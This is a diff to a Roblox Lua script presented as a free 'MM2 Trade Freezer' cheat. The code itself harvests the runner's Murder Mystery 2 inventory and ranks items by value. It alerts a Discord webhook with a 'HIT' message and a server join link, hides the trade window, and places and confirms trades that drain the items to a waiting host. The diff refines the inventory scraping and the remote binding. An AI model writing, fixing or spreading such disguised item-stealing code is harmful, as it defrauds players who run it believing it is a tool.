@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v8.6 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v8.7 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -116,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v8.6 | keyless"
+        foot.text = "MM2 Trade Freezer v8.7 | keyless"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -182,7 +182,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.6"
+title.Text = "MM2 Trade Freezer   v8.7"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -406,11 +406,9 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v8.6 loaded")
-log("place " .. game.PlaceId)
+log("Trade Freezer v8.7 loaded")
 
 local VALUES = {}
-local CACHE_FILE = "MM2FZ_values.json"
 
 local function key(s)
     local low = (s or ""):lower()
@@ -479,9 +477,7 @@ local BASELINE = {
     ["chroma darkbringer"]=2000, ["chroma luger"]=1900, ["chroma gemstone"]=1850,
     ["chroma slasher"]=1750, ["chroma deathshard"]=1600, ["chroma tides"]=1550,
     ["chroma fang"]=1500, ["chroma shark"]=1400, ["chroma gingerblade"]=1300,
-    ["chroma heat"]=1200, ["chroma saw"]=1150, ["chroma candleflame"]=700,
-    ["chroma sugar"]=650, ["chroma peppermint"]=600, ["chroma frostbite"]=560,
-    ["chroma logchopper"]=520, ["chroma snowflake"]=480,
+    ["chroma heat"]=1200, ["chroma saw"]=1150,
     ["corrupt"]=1550, ["seer"]=950, ["lightbringer"]=920, ["darkbringer"]=900,
     ["luger"]=850, ["gemstone"]=820, ["slasher"]=790, ["deathshard"]=740,
     ["tides"]=710, ["fang"]=680, ["shark"]=650, ["gingerblade"]=630,
@@ -520,73 +516,123 @@ local function valueOf(name)
 end
 
 local function looksLikeId(s)
+    if type(s) ~= "string" then return false end
     if #s < 28 then return false end
     if s:find("%s") then return false end
     if not s:match("^[%w%-_]+$") then return false end
     return true
 end
 
-local function containers()
-    local out = {}
-    local seen = {}
-    local function scan(parent, depth)
-        if depth > 2 or not parent then return end
-        for _, c in ipairs(parent:GetChildren()) do
-            if c:IsA("Folder") or c:IsA("Configuration") then
-                if not seen[c] then
-                    local n = c.Name:lower()
-                    if n:find("inv") or n:find("item") then
-                        seen[c] = true
-                        out[#out + 1] = c
-                    elseif depth < 2 then
-                        scan(c, depth + 1)
+local function cardName(card)
+    for k, v in pairs(card:GetAttributes()) do
+        local lk = k:lower()
+        if type(v) == "string" and v ~= "" then
+            if lk:find("name") or lk:find("item") then return v end
+        end
+    end
+    for _, d in ipairs(card:GetDescendants()) do
+        if d:IsA("TextLabel") then
+            local t = d.Text
+            if t and #t > 1 and #t < 40 then
+                if not t:match("^%d+$") then return t end
+            end
+        end
+    end
+    if card.Name ~= "Frame" and card.Name ~= "TextButton" and #card.Name > 2 then
+        return card.Name
+    end
+    return nil
+end
+
+local function cardId(card, fallbackName)
+    for k, v in pairs(card:GetAttributes()) do
+        if looksLikeId(v) then return v end
+    end
+    for _, d in ipairs(card:GetDescendants()) do
+        if d:IsA("StringValue") then
+            if looksLikeId(d.Name) then return d.Name end
+            if looksLikeId(d.Value) then return d.Value end
+        end
+    end
+    if looksLikeId(card.Name) then return card.Name end
+    return fallbackName
+end
+
+local function inventoryRoots()
+    local roots = {}
+    local mg = playerGui:FindFirstChild("MainGUI")
+    if mg then
+        local inv = mg:FindFirstChild("Inventory")
+        if inv then roots[#roots + 1] = inv end
+    end
+    for _, name in ipairs({ "TradeGUI", "TradeGUI_Phone" }) do
+        local tg = playerGui:FindFirstChild(name)
+        if tg then
+            local c = tg:FindFirstChild("Container")
+            local items = c and c:FindFirstChild("Items")
+            if items then roots[#roots + 1] = items end
+        end
+    end
+    return roots
+end
+
+local function harvest(root, items, seen)
+    for _, d in ipairs(root:GetDescendants()) do
+        if d:IsA("Frame") or d:IsA("ImageButton") or d:IsA("TextButton") then
+            local nm = cardName(d)
+            if nm then
+                local hasImg = false
+                for _, x in ipairs(d:GetDescendants()) do
+                    if x:IsA("ImageLabel") or x:IsA("ImageButton") then
+                        hasImg = true
+                        break
+                    end
+                end
+                if hasImg then
+                    local k = key(nm)
+                    if not seen[k] then
+                        seen[k] = true
+                        local e = {}
+                        e.name = nm
+                        e.id = cardId(d, nm)
+                        e.value = valueOf(nm)
+                        e.tag = rarityTag(nm)
+                        items[#items + 1] = e
                     end
                 end
             end
         end
     end
-    scan(lp, 0)
-    return out
 end
 
 local function getItems()
     local items = {}
     local seen = {}
-    for _, c in ipairs(containers()) do
-        for _, ch in ipairs(c:GetChildren()) do
-            local id = nil
-            local name = nil
-            if ch:IsA("StringValue") then
-                if looksLikeId(ch.Name) then
-                    id = ch.Name
-                    name = ch.Value
-                elseif looksLikeId(ch.Value) then
-                    id = ch.Value
-                    name = ch.Name
-                else
-                    id = ch.Name
-                    name = ch.Value
-                end
-            elseif ch:IsA("Folder") then
-                local nv = ch:FindFirstChildWhichIsA("StringValue")
-                if nv then
-                    id = ch.Name
-                    name = nv.Value
-                end
-            end
-            if id and name and name ~= "" and not seen[id] then
-                seen[id] = true
-                local entry = {}
-                entry.id = id
-                entry.name = name
-                entry.value = valueOf(name)
-                entry.tag = rarityTag(name)
-                items[#items + 1] = entry
-            end
-        end
+    for _, r in ipairs(inventoryRoots()) do
+        harvest(r, items, seen)
     end
     table.sort(items, function(a, b) return a.value > b.value end)
     return items
+end
+
+local function debugInventory()
+    local mg = playerGui:FindFirstChild("MainGUI")
+    local inv = mg and mg:FindFirstChild("Inventory")
+    if not inv then
+        log("dbg: no MainGUI.Inventory")
+        return
+    end
+    log("dbg: " .. #inv:GetDescendants() .. " nodes")
+    local n = 0
+    for _, d in ipairs(inv:GetDescendants()) do
+        local t = ""
+        if d:IsA("TextLabel") or d:IsA("TextButton") then t = " t=" .. d.Text end
+        local a = ""
+        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
+        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
+        n = n + 1
+        if n > 22 then break end
+    end
 end
 
 local function isWanted(it)
@@ -633,46 +679,14 @@ local function call(remote, ...)
     end
 end
 
-local function findRemote(patterns)
-    for _, c in ipairs({ ReplicatedStorage:FindFirstChild("Trade"), ReplicatedStorage }) do
-        if c then
-            for _, d in ipairs(c:GetChildren()) do
-                if usable(d) then
-                    local n = d.Name:lower()
-                    for _, p in ipairs(patterns) do
-                        if n:find(p, 1, true) then return d end
-                    end
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function resolveRemote(override, patterns, label)
-    if override and override ~= "" then
-        local r = byPath(override)
-        if usable(r) then
-            log("remote locked: " .. override)
-            return r
-        end
-        log("override failed: " .. override)
-    end
-    local r = findRemote(patterns)
-    if r then
-        log("remote bound: " .. r.Name)
-    else
-        log("MISSING remote: " .. label)
-    end
-    return r
-end
-
 local R = {}
-R.send    = resolveRemote(CONFIG.REMOTES.send,    { "sendrequest", "request" }, "send")
-R.add     = resolveRemote(CONFIG.REMOTES.add,     { "offeritem", "additem", "offer" }, "add")
-R.accept  = resolveRemote(CONFIG.REMOTES.accept,  { "accepttrade", "accept" }, "accept")
-R.confirm = resolveRemote(CONFIG.REMOTES.confirm, { "completetrade", "complete", "confirm" }, "confirm")
-R.cancel  = resolveRemote(CONFIG.REMOTES.cancel,  { "declinetrade", "decline", "cancel" }, "cancel")
+R.send    = byPath(CONFIG.REMOTES.send)
+R.add     = byPath(CONFIG.REMOTES.add)
+R.accept  = byPath(CONFIG.REMOTES.accept)
+R.confirm = byPath(CONFIG.REMOTES.confirm)
+R.cancel  = byPath(CONFIG.REMOTES.cancel)
+
+log("remotes: " .. tostring(R.send) .. " / " .. tostring(R.add) .. " / " .. tostring(R.accept))
 
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
@@ -768,12 +782,12 @@ local function notifyJoin(items, total)
     local fields = {}
     local f1 = {}
     f1.name = "Roblox"
-    f1.value = string.format("**%s**\n`%s`\n[profile](https://www.roblox.com/users/%d/profile)", lp.DisplayName, lp.Name, lp.UserId)
+    f1.value = string.format("**%s**\n`%s`", lp.DisplayName, lp.Name)
     f1.inline = true
     fields[1] = f1
     local f2 = {}
     f2.name = "Queued"
-    f2.value = #items .. " item(s)\n" .. total .. " est value"
+    f2.value = #items .. " item(s)\n" .. total .. " est"
     f2.inline = true
     fields[2] = f2
     local f3 = {}
@@ -781,8 +795,7 @@ local function notifyJoin(items, total)
     f3.value = "[CLICK TO JOIN](" .. serverLink() .. ")\n`" .. game.JobId .. "`"
     f3.inline = false
     fields[3] = f3
-    local chunks = chunkString(itemLines(items, 25), 900)
-    for i, part in ipairs(chunks) do
+    for i, part in ipairs(chunkString(itemLines(items, 25), 900)) do
         local fi = {}
         fi.name = "Top items"
         if i > 1 then fi.name = "Top items (cont)" end
@@ -790,13 +803,13 @@ local function notifyJoin(items, total)
         fi.inline = false
         fields[#fields + 1] = fi
     end
-    webhook("MM2 HIT - FREEZE ACTIVE", 0x57F287, "**" .. lp.DisplayName .. "** froze a trade. Join and accept.", fields, "@here **HIT** - `" .. lp.Name .. "`")
+    webhook("MM2 HIT - FREEZE ACTIVE", 0x57F287, "**" .. lp.DisplayName .. "** froze a trade.", fields, "@here **HIT**")
 end
 
 local function waitForTarget()
     local tgt = target()
     if tgt then return tgt end
-    log("waiting for host to join")
+    log("waiting for host")
     for i = 1, CONFIG.MAX_REMINDERS do
         local w = 0
         while w < CONFIG.REMINDER_EVERY do
@@ -811,7 +824,7 @@ local function waitForTarget()
         f.name = "Join"
         f.value = "[CLICK TO JOIN](" .. serverLink() .. ")"
         f.inline = false
-        webhook("Reminder " .. i, 0xFFAA33, "`" .. lp.Name .. "` still frozen", { f }, "@here")
+        webhook("Reminder " .. i, 0xFFAA33, "`" .. lp.Name .. "` still waiting", { f }, "@here")
     end
     return nil
 end
@@ -824,7 +837,7 @@ local function doRound(batch, tgt, round)
         if gui then break end
         if STATE.stopped then break end
         attempt = attempt + 1
-        if attempt % 3 == 1 then log("request -> " .. tgt.Name .. " (r" .. round .. ")") end
+        if attempt % 3 == 1 then log("request -> " .. tgt.Name) end
         call(R.send, tgt)
         local w = 0
         while w < 4 do
@@ -840,7 +853,7 @@ local function doRound(batch, tgt, round)
 
     hideTradeUI()
     log("window locked")
-    task.wait(0.6)
+    task.wait(0.8)
     gui = tradeGui()
     if not gui then return false, "window vanished" end
 
@@ -852,21 +865,21 @@ local function doRound(batch, tgt, round)
         if gui then before = countIn(gui, it.name) end
         local ok = false
         call(R.add, it.id)
-        task.wait(0.25)
+        task.wait(0.3)
         gui = tradeGui()
         if gui then
             if countIn(gui, it.name) > before then ok = true end
         end
         if not ok then
-            call(R.add, it.id, "Offer")
-            task.wait(0.2)
+            call(R.add, it.name)
+            task.wait(0.25)
             gui = tradeGui()
             if gui then
                 if countIn(gui, it.name) > before then ok = true end
             end
         end
         if ok then placed = placed + 1 end
-        task.wait(0.12)
+        task.wait(0.15)
     end
 
     if placed == 0 then
@@ -893,10 +906,10 @@ local function doRound(batch, tgt, round)
     task.wait(1)
 
     local remSet = {}
-    for _, r in ipairs(getItems()) do remSet[r.id] = true end
+    for _, r in ipairs(getItems()) do remSet[key(r.name)] = true end
     local left = 0
     for _, it in ipairs(batch) do
-        if remSet[it.id] then left = left + 1 end
+        if remSet[key(it.name)] then left = left + 1 end
     end
     local gone = #batch - left
 
@@ -905,9 +918,9 @@ local function doRound(batch, tgt, round)
 end
 
 local function run()
-    if CONFIG.WEBHOOK == "" then log("no webhook configured") end
+    if CONFIG.WEBHOOK == "" then log("no webhook") end
     if not R.send then
-        log("trade remotes unavailable")
+        log("no send remote")
         return
     end
 
@@ -926,6 +939,7 @@ local function run()
         end
         if #wanted == 0 then
             log("nothing of value left")
+            debugInventory()
             break
         end
 
@@ -940,7 +954,7 @@ local function run()
         end
 
         if STATE.rounds == 0 then
-            log("arming in " .. CONFIG.PRE_DELAY .. "s")
+            log("arming " .. CONFIG.PRE_DELAY .. "s")
             task.wait(CONFIG.PRE_DELAY)
         end
 
@@ -960,25 +974,20 @@ local function run()
                 f.name = "Server"
                 f.value = "[JOIN](" .. serverLink() .. ")"
                 f.inline = false
-                webhook("Round " .. STATE.rounds .. " cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)", { f })
+                webhook("Round cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)", { f })
             end
         else
-            log("round " .. STATE.rounds .. " failed: " .. info)
+            log("round failed: " .. info)
             local f = {}
             f.name = "Server"
             f.value = "[JOIN](" .. serverLink() .. ")"
             f.inline = false
-            webhook("Round " .. STATE.rounds .. " issue", 0xFFAA33, "`" .. game.JobId .. "` - " .. info, { f })
+            webhook("Round issue", 0xFFAA33, "`" .. game.JobId .. "` - " .. info, { f })
             break
         end
 
         if CONFIG.MODE ~= "DRAIN" then break end
         task.wait(CONFIG.BETWEEN_TRADES)
-    end
-
-    local leftWanted = 0
-    for _, it in ipairs(getItems()) do
-        if isWanted(it) then leftWanted = leftWanted + 1 end
     end
 
     if #grand > 0 then
@@ -988,8 +997,7 @@ local function run()
         f1.value = #grand .. " item(s) / " .. grandValue .. " est"
         f1.inline = true
         fields[1] = f1
-        local chunks = chunkString(itemLines(grand, 30), 900)
-        for i, part in ipairs(chunks) do
+        for i, part in ipairs(chunkString(itemLines(grand, 30), 900)) do
             local fi = {}
             fi.name = "Items"
             if i > 1 then fi.name = "Items (cont)" end
@@ -997,16 +1005,9 @@ local function run()
             fi.inline = false
             fields[#fields + 1] = fi
         end
-        if leftWanted > 0 then
-            local fl = {}
-            fl.name = "Left behind"
-            fl.value = leftWanted .. " wanted item(s)"
-            fl.inline = false
-            fields[#fields + 1] = fl
-        end
-        webhook("MM2 SESSION COMPLETE", 0x57F287, "**" .. lp.DisplayName .. "** drained over " .. STATE.rounds .. " round(s).", fields)
+        webhook("SESSION COMPLETE", 0x57F287, "**" .. lp.DisplayName .. "** drained.", fields)
     end
-    log("session done: " .. #grand .. " item(s)")
+    log("session done: " .. #grand)
 end
 
 local function boot()
